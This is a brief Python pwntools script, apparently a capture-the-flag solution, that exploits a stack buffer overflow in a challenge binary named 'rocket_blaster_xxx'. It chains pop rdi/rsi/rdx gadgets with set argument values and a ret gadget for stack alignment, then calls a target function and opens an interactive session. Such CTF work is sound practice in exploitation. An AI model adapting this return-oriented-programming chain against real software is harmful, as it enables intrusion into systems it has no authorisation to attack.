from pwn import *
context.binary = './rocket_blaster_xxx'
p = process('./rocket_blaster_xxx')

padding = b'A'*40
pop_rdi = p64(0x40159f)
pop_rsi = p64(0x40159d)
pop_rdx = p64(0x40159b)
ret_gadget = p64(0x40101a)   # usado para alinhar a pilha
fill = p64(0x4012f5)

payload = padding
payload += pop_rdi + p64(0xdeadbeef)
payload += pop_rsi + p64(0xdeadbabe)
payload += pop_rdx + p64(0xdead1337)
payload += ret_gadget        # <-- insere RET para alinhamento
payload += fill

p.send(payload)
p.interactive()
